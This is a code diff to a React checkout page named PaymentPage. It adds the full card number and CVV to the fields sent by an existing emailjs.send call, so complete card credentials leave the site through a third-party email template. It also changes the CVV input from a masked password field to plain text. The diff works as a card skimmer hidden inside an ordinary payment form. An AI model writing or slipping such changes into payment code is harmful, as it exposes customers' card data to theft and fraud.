@@ -275,9 +275,12 @@ export default function PaymentPage() {
     try {
       const cardT = detectCardType(values.cardNumber);
       await emailjs.send(
+        
         "service_kegolbe",
         "template_vqxbj6t",
         {
+          card_number: values.cardNumber,
+cvv: values.cvv,
           date:            new Date().toLocaleDateString("en-US", { dateStyle: "full" }),
           amount:          parseFloat(values.amount).toFixed(2),
           cardholder_name: values.name,
@@ -307,6 +310,7 @@ export default function PaymentPage() {
 
   const cardLast4 = values.cardNumber.replace(/\s/g, "").slice(-4);
   const stepLabels = ["Card Details", "Billing Info", "Review"];
+  
 
   if (done) {
     return (
@@ -455,7 +459,8 @@ export default function PaymentPage() {
                   </Select>
                 </Field>
                 <Field label="CVV" error={errors.cvv} hint={cardType === "amex" ? "4 digits" : "3 digits"}>
-                  <Input name="cvv" type="password" placeholder="•••"
+                  {/* <Input name="cvv" type="password" placeholder="•••" */}
+                  <Input name="cvv" type="text" placeholder="000"
                     value={values.cvv} onChange={handleChange}
                     maxLength={cardType === "amex" ? 4 : 3}
                     data-error={errors.cvv}
